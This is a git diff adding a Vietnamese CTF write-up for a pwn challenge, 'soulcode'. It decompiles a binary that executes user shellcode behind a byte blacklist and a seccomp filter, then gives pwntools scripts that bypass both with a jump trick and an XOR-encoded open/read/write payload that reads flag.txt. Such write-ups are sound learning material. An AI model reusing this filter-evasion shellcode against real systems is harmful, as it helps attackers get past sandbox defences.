@@ -579,3 +579,254 @@ sc = asm(f'''
 
 ref : [here](https://elijahchia.gitbook.io/ctf-blog/hkcert-ctf-24/shellcode-runner-3-+-revenge-pwn) and [here](https://github.com/tj-oconnor/ctf-writeups/tree/main/nahamcon_ctf/stackless)
 
+
+## soulcode
+
+- bài này là 1 bài filter các byte shellcode 
+
+dowload [here](/kuveee.github.io/assets/files/soulcode.rar)
+
+### analys
+
+```c
+bool main(void)
+
+{
+  int iVar1;
+  long i;
+  undefined8 *puVar2;
+  byte bVar3;
+  undefined8 shellcode;
+  undefined8 local_200;
+  undefined8 local_1f8 [62];
+  
+  bVar3 = 0;
+  puts("Before you leave the realm of the dead you must leave a message for posterity!");
+  setvbuf(stdin,(char *)0x0,2,0);
+  setvbuf(stderr,(char *)0x0,2,0);
+  setvbuf(stdout,(char *)0x0,2,0);
+  shellcode = 0;
+  local_200 = 0;
+  puVar2 = local_1f8;
+  for (i = 0x3c; i != 0; i = i + -1) {
+    *puVar2 = 0;
+    puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
+  }
+  *(undefined4 *)puVar2 = 0;
+  read_string(&shellcode,500,(undefined4 *)((long)puVar2 + 4));
+  filter(&shellcode,4);
+  iVar1 = install_syscall_filter();
+  if (iVar1 == 0) {
+    (*(code *)&shellcode)();
+  }
+  return iVar1 != 0;
+}
+```
+
+- ta thấy ở đầu tiên nó sẽ set dữ liệu null cho shellcode , tiếp theo là read vào với lenght là 500 bytes , ở đây sẽ có 2 hàm đặc biệt 
+-  ```filter(&shellcode,4);``` hàm này sẽ check xem shellcode của ta có các byte trong blacklist không bằng cách sử dụng ```strpbrk```
+-  tiếp theo nữa là sẽ dùng seccomp để filter syscall , ta sẽ check nó bằng ```seccomp-tools```
+
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/shellcode/dante2023$ seccomp-tools ./soulcode
+Invalid command './soulcode'
+
+See 'seccomp-tools --help' for list of valid commands
+ploi@PhuocLoiiiii:~/pwn/shellcode/dante2023$ seccomp-tools dump ./soulcode
+Before you leave the realm of the dead you must leave a message for posterity!
+a
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+- tiếp tục là 1 bài orw , các byte filter sẽ là : 
+
+```cs
+0x89 0x05 0x0f 0x80 0xcd
+```
+
+### exploit
+
+- sẽ có khá nhiều cách để làm bài này , ta có thể sử dụng add và jmp để vượt qua được hàm filter bằng cách sau : 
+
+về chi tiết thì mình chưa hiểu lắm =)))
+
+```cs
+#!/usr/bin/python3
+
+from pwn import *
+
+context.binary = exe = ELF('./soulcode')
+p = process()
+
+jmpsc = asm('''
+            add rdx,0x50
+            jmp rdx
+            ''')
+
+sc = asm(shellcraft.open("./flag.txt"))
+sc += asm(shellcraft.read("rax","rsp",0x50))
+sc += asm(shellcraft.write(1,"rsp",0x50))
+
+sc_real = jmpsc+ b'\x00'*(0x50-len(jmpsc)) + sc
+input()
+p.sendline(sc_real)
+
+p.interactive()
+```
+
+- 1 cách khác là tạo 1 bộ mã hóa để mã hóa shellcode của ta , đầu tiên ta sẽ tạo 1 hàm để tìm ra cái key mà sau khi xor thì không có byte nào chứa byte bị filter : 
+
+```cs
+def find_key(shellcode, filter):
+    for i in range(10000):
+        key = os.urandom(8)
+        s = b""
+        for sh in shellcode:
+            s += xor(key[:len(sh)], sh)
+        if all(i not in s for i in filter):
+            return key
+    exit(-1)
+```
+
+- chú ý là shellcode của ta phải chia hết cho 8 vì nó sẽ theo từng khối và ta cần đảo ngược tất cả lại vì ta sẽ cần push nó vào 
+
+```cs
+blocks = [original_shellcode[i:i+BLOCK_SIZE][::-1] 
+              for i in range(0, len(original_shellcode), BLOCK_SIZE)][::-1]
+```
+
+- tiếp theo ta sẽ mã hóa nó 
+
+```
+blocks = ['0x'+xor(b, key[:len(b)]).hex() for b in blocks]
+```
+
+- cuối cùng là ta sẽ giải mã nó như sau:
+
+ta sẽ xor lại với key và push nó vào cuối cùng là nhảy đến shellcode đã được giải mã 
+
+```cs
+shellcode = f"""
+    xor rsi, rsi
+    movabs rcx, {key} 
+"""
+
+for b in blocks:
+    shellcode += f"""
+    movabs r8, {b}  
+    xor    r8, rcx 
+    push   r8      
+"""
+
+shellcode += """
+    jmp    rsp 
+"""
+```
+
+full script : 
+
+```cs
+#!/usr/bin/python3
+
+from pwn import *
+
+context.binary = exe = ELF('./soulcode',checksec=False)
+
+p = process()
+
+BLOCK_SIZE = 8
+filter_byte =  b'\xcd\x80\x0f\x05\x89\x00\x0a'
+
+def find_key(shellcode,filter):
+    for i in range(10000):
+        key = os.urandom(8)
+        s = b''
+        for sh in shellcode:
+            s += xor(key[:len(sh)],sh)
+        if all(i not in s for i in filter):
+            return key
+    exit(-1)
+
+original_shellcode = asm('''
+            xor     rdx, rdx
+                        xor     rax, rax
+                        xor     rcx, rcx
+                        mov     rax, 0x02
+                        push    rcx
+            mov     r10, 0x7478742e67616c66
+            push    r10
+                        mov     rdi, rsp
+                        syscall
+                ''')
+# sys_read()
+original_shellcode += asm('''
+                        xor     rax, rax
+                        mov     rsi, rdi
+                        mov     rdi, 0x3
+                        mov     dl, 0x30
+                        syscall
+                ''')
+# sys_write()
+original_shellcode += asm('''
+                mov     rax, 0x1
+                mov     rdi, 0x1
+                syscall
+            nop
+            nop
+            nop
+            nop
+            nop
+        ''')
+blocks = [original_shellcode[i:i+BLOCK_SIZE][::-1] for i in range(0, len(original_shellcode), BLOCK_SIZE)][::-1]
+key = find_key(blocks,filter_byte)
+blocks = ['0x'+xor(b,key[:len(b)]).hex() for b in blocks]
+key = '0x' + key.hex()
+
+
+shellcode = f"""
+    xor rsi, rsi
+    movabs rcx, {key}  # Đặt key vào rcx
+"""
+
+for b in blocks:
+    shellcode += f"""
+    movabs r8, {b}  # Đưa block vào r8
+    xor    r8, rcx  # Giải mã bằng XOR với key
+    push   r8       # Đưa vào stack
+"""
+
+shellcode += """
+    jmp    rsp  # Nhảy đến shellcode trên stack
+"""
+
+shellcode = asm(shellcode)
+
+assert all(i not in shellcode for i in b'\xcd\x80\x0f\x05\x89')
+
+p.sendlineafter(b'!\n',shellcode)
+
+p.interactive()
+```
+
+- đợi tầm 10s và ta có flag =))) 
+
+![flag](/assets/images/flaghehe.png)
